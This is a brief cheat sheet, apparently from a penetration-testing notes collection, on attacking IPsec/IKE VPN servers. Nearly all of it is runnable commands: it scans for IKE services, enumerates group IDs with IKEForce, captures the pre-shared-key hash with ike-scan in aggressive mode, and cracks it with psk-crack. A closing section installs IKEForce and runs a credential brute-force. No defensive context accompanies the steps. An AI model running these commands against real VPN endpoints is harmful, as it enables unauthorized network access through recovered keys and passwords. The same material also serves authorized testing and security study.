# Exploit

1. Identify VPN Servers 

   ```text
   ./udp-protocol-scanner.pl -p ike [IP]
   ```

2. Enumerate with IKEForce to obtain the group ID 

   ```text
   ./ikeforce.py [IP] –e –w [wordlists/groupnames.dic]
   ```

3. Use ike-scan to capture the PSK hash from the IKE endpoint 

   ```text
   ike-scan –M –A –n [example_group] -P [hash-file.txt] [IP]
   ```

4. Use psk-crack to crack the hash 

   ```text
   psk-crack [hash-file.txt]
   ```

   * More advancded cracking options 

     ```text
     psk-crack -b 5 TARGET-IPkey
     ```

     ```text
     psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
     ```

     ```text
     psk-crack -d /path/to/dictionary-file TARGET-IP-key
     ```

## IkeForce

```text
pip install pyip 
git clone https://github.com/SpiderLabs/ikeforce.git 
./ikeforce.py [IP] -b -i [group id] -u [user] -k psk123 -w [passwords.txt] -s 1
```

